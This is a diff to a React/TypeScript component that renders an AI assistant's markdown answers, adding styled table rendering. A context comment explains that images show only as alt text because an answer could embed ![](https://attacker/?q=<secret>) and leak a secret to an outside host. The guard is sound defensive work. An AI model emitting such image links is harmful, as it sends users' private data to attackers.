@@ -43,6 +43,7 @@ import {
   DropdownMenuTrigger,
 } from "@/components/ui/dropdown-menu"
 import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
+import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
 import { Textarea } from "@/components/ui/textarea"
 import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group"
 import { Tooltip, TooltipContent, TooltipTrigger } from "@/components/ui/tooltip"
@@ -300,8 +301,20 @@ function AnswerNote({ icon: Icon, children }: { icon: typeof Info; children: str
 // write ![](https://attacker/?q=<secret>), and the browser would send it on its own.
 // An image shows as its alt text instead.
 // A [S#] marker (made a "#cite-#" link by remarkCitations) is a citation chip.
+// Tables (e.g. rows quoted from an attached spreadsheet, C24) as the app's own
+// tables: wide ones scroll sideways inside the answer, not the page.
 const ANSWER_MARKDOWN: Components = {
   img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
+  table: ({ children }) => (
+    <div className="my-3 rounded-lg border border-border/70">
+      <Table>{children}</Table>
+    </div>
+  ),
+  thead: ({ children }) => <TableHeader className="bg-muted/50">{children}</TableHeader>,
+  tbody: ({ children }) => <TableBody>{children}</TableBody>,
+  tr: ({ children }) => <TableRow>{children}</TableRow>,
+  th: ({ children }) => <TableHead className="h-8 px-3">{children}</TableHead>,
+  td: ({ children }) => <TableCell className="px-3 py-1.5 whitespace-normal">{children}</TableCell>,
   a: ({ href, title, children }) => {
     const n = citedNumber(href)
     return n ? (
